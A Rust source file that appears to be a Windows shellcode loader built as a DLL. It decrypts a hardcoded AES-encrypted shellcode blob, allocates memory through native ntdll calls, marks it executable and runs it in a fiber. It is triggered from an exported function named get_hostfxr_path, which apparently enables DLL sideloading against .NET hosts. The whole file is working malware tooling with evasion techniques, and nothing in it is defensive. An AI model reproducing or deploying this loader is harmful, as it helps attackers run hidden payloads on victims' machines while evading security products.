use std::ffi::c_void;
use std::mem::transmute;
use std::ptr::{copy, null, null_mut};
use windows_sys::Win32::Foundation::{GetLastError, NTSTATUS};
use windows_sys::Win32::System::Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE, PAGE_READWRITE};
use windows_sys::Win32::System::Threading::{ConvertThreadToFiber, CreateFiber, SwitchToFiber};
use aes::Aes256;
use block_modes::{BlockMode, Cbc};
use block_modes::block_padding::Pkcs7;
use hex;

#[link(name = "ntdll")]
extern "system" {
    fn NtAllocateVirtualMemory(
        ProcessHandle: isize,
        BaseAddress: *mut *mut c_void,
        ZeroBits: usize,
        RegionSize: *mut usize,
        AllocationType: u32,
        Protect: u32,
    ) -> NTSTATUS;

    fn NtProtectVirtualMemory(
        ProcessHandle: isize,
        BaseAddress: *mut *mut c_void,
        NumberOfBytesToProtect: *mut usize,
        NewAccessProtection: u32,
        OldAccessProtection: *mut u32,
    ) -> NTSTATUS;
}

fn main_payload() {
    let key_hex = "92416c37876e63c7900b015ac5466af6cfe76935a37e4bd1cd1f577cc04728fa";
    let iv_hex = "a4cdbd38dbfce9532cb286a53454952b";
    let hex_shellcode = "e55e3d8b6b38ac6dc535df5662e9c3f2c565cc80c5638a888d10838cd1fd94e43e896cbfb7bf5cd9f72596b2ff5cc37bd37ff7e48aab9d0ef5de867b5af49e7b545f3f32f81dbc2f7538598a1b282eccab0cee859b00acfdc8813ec2fabade51e24282950ce72d0b3df88ac7083bf355";

    // Convert hex strings to byte arrays
    let key = hex::decode(key_hex).expect("Failed to decode key");
    let iv = hex::decode(iv_hex).expect("Failed to decode IV");
    let encrypted_shellcode = hex::decode(hex_shellcode).expect("Failed to decode shellcode");

    // Decrypt the shellcode
    let shellcode = aes_decrypt(&encrypted_shellcode, &key, &iv);
    let shellcode_size = shellcode.len();

    unsafe {
        // Convert thread to fiber
        let main_fiber = ConvertThreadToFiber(null());
        if main_fiber.is_null() {
            panic!("[-] ConvertThreadToFiber failed: {}!", GetLastError());
        }

        // Allocate memory
        let mut addr: *mut c_void = null_mut();
        let mut size = shellcode_size as usize;
        let status = NtAllocateVirtualMemory(
            -1isize,
            &mut addr,
            0,
            &mut size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );
        if status != 0 {
            panic!("[-] NtAllocateVirtualMemory failed: {}!", GetLastError());
        }

        // Copy the shellcode to the allocated memory
        copy(shellcode.as_ptr(), addr.cast(), shellcode_size);

        // Change the memory protection to executable
        let mut old_protect = PAGE_READWRITE;
        let status = NtProtectVirtualMemory(
            -1isize,
            &mut addr,
            &mut size,
            PAGE_EXECUTE,
            &mut old_protect,
        );
        if status != 0 {
            panic!("[-] NtProtectVirtualMemory failed: {}!", GetLastError());
        }

        // Create a fiber to execute the shellcode
        let func: unsafe extern "system" fn(*mut c_void) = transmute(addr);
        let fiber = CreateFiber(0, Some(func), null_mut());
        if fiber.is_null() {
            panic!("[-] CreateFiber failed: {}!", GetLastError());
        }

        // Switch to the new fiber and then back to the main fiber
        SwitchToFiber(fiber);
        SwitchToFiber(main_fiber);
    }
}

fn aes_decrypt(encrypted_data: &[u8], key: &[u8], iv: &[u8]) -> Vec<u8> {
    let cipher = Cbc::<Aes256, Pkcs7>::new_from_slices(key, iv).unwrap();
    cipher.decrypt_vec(encrypted_data).expect("Failed to decrypt data")
}




#[no_mangle]
pub extern "C" fn get_hostfxr_path()
{
    main_payload();
}